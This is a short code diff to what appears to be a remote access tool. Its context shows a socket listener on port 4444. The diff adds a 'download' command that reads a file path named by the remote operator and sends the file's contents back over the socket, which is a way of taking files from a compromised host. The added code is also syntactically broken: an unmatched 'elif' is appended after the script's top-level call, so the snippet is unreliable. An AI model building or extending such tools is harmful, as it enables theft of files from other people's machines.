@@ -36,3 +36,16 @@ def start_listener(ip='0.0.0.0', port=4444):
         thread.start()
 
 start_listener()
+
+#Download files#
+
+import os
+
+elif cmd.startswith("download "):
+    path = cmd.split(" ", 1)[1]
+    if os.path.exists(path):
+        with open(path, "rb") as f:
+            data = f.read()
+        s.sendall(data)
+    else:
+        s.send(b"File not found.")
